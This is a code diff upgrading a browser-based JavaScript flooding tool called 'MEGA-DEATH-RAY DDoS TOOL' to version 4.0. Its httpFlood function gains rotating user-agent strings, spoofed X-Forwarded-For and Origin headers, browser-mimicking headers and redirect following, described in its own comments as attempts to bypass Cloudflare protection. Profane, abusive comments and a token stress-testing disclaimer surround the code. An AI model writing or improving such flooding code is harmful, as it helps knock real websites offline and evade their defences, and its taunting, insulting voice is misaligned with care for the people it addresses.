@@ -1,5 +1,5 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v3.0)
-// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, ya fuckin' degenerate.
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v4.0)
+// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
 
@@ -144,6 +144,8 @@ const infoDiv = document.createElement('div');
 infoDiv.innerHTML = `
     <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
     <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests. Overwhelming it is the goal, fuckface.</p>
+    <p>A Distributed Denial of Service (DDoS) attack is a type of cyber attack in which a malicious actor floods a server with traffic to make the server unavailable to its intended users. The goal of a DDoS attack is to overwhelm the server, network, or application with more requests than it can handle, causing it to crash or become unresponsive.</p>
+    <p><b>DDoS attacks are often carried out using a botnet, which is a network of compromised computers or other devices that are infected with malware and controlled by a single attacker.</b></p>
     <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload. Keep in mind the server is like a bridge, and too many cars results in it collasping.</p>
     <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences, you stupid shit. Don't be a moron.</p>
 `;
@@ -166,28 +168,52 @@ function logAction(message) {
     logList.appendChild(newLog);
 }
 
+// Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
 async function httpFlood(url) {
     const randomString = Math.random().toString(36).substring(2, 15);
     const referer = `https://www.google.com/search?q=${randomString}`;
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    ];
+    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
     // Add extra malicious headers, because why the fuck not?
     try {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 
         const response = await fetch(url, {
             mode: 'no-cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
             headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'User-Agent': randomUserAgent,
                 'Referer': referer, // Spoofed referer – because you're sneaky like that.
-                'X-Forwarded-For': Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255), // Spoof IP address - because you're a ghost
-                'Origin': 'https://www.totallylegitwebsite.com' // Spoof origin header – another layer of fuckery.
+                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'), // Spoof IP address - because you're a ghost
+                'Origin': 'https://www.totallylegitwebsite.com', // Spoof origin header – another layer of fuckery.
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
             },
+            redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal
         });
 
         clearTimeout(timeoutId);
+
+        // Attempt to read the response (even if it's opaque) to trigger Cloudflare's checks
+        try {
+            await response.text();
+        } catch (e) {
+            console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
+        }
 
         console.log('Noodles Inc: Request sent successfully. Status:', response.status);
         logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
@@ -199,6 +225,7 @@ async function httpFlood(url) {
     console.log("Noodles Inc: DDoS attack sent to: " + url);
     logAction(`DDoS attack sent to: ${url}`);
 }
+
 
 function startDDoS(targetUrl, requestRate) {
     if (!targetUrl) {
